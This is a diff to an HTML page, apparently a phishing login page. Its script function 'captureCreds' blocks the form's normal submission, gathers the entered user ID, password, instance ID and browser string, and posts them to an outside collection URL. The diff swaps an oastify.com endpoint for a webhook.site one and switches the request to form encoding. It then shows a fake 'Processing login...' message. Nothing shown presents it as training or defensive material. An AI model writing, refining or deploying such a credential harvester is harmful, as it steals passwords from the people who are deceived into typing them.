@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -54,20 +53,21 @@
   <script>
     function captureCreds(e) {
       e.preventDefault();
-      const data = {
-        userId: document.getElementById('userId').value,
-        password: document.getElementById('password').value,
-        instanceId: document.getElementById('instanceId').value,
-        browser: navigator.userAgent
-      };
+      const form = new URLSearchParams();
+      form.append("userId", document.getElementById('userId').value);
+      form.append("password", document.getElementById('password').value);
+      form.append("instanceId", document.getElementById('instanceId').value);
+      form.append("browser", navigator.userAgent);
 
-      fetch('http://mj9onpu91gg0a0sk9d86mfcxxo3gr6fv.oastify.com', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: JSON.stringify(data)
+      fetch("https://webhook.site/e5647540-8056-4b70-88ed-25fc94a8618c", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: form
       });
 
-      alert('Processing login...');
+      alert("Processing login...");
     }
   </script>
 </body>
